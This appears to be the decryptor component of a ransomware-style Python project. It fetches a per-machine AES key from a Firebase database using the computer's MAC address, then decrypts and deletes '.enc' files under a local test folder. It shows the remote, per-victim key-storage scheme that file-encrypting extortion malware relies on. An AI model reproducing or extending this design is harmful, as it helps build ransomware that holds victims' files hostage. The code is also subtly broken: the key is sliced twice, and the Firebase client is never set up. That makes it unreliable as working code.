import crypto
import sys
sys.modules['Crypto'] = crypto
from Cryptodome.Cipher import AES
import os.path
import struct
from uuid import getnode as get_mac
from firebase import firebase

IV_SIZE = 16    # 128 bit, fixed for the AES algorithm
KEY_SIZE = 32   # 256 bit meaning AES-256, can also be 128 or 192 bits
SALT_SIZE = 16  # This size is arbitrary

def dec_file(base, in_filename, out_filename=None, chunksize=24*1024):
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    iv = base[0:IV_SIZE]
    key = base[IV_SIZE:]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CFB, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)

def search_dec(path):
    try:
        files = os.listdir(path)
        for file in files:
            filename = os.path.join(path, file)
            if(os.path.isdir(filename)):
                search_dec(filename)
            else:
                fname, ext = os.path.splitext(filename)
                if (ext == '.enc'):
                    dec_file(key, filename)
                    os.remove(filename)
    except PermissionError:
        pass

testPath = 'C:/Users/tmdgh/Desktop/test123/'

mac = get_mac()
password = str(mac)

users = firebase.get('/user/'+ password, None)
print(users)
hawi = list(users.values())[0]["IV"].encode('utf-16')

iv = hawi[2:IV_SIZE+2]
key= hawi[IV_SIZE+2:]

print("decoding")
search_dec(testPath)
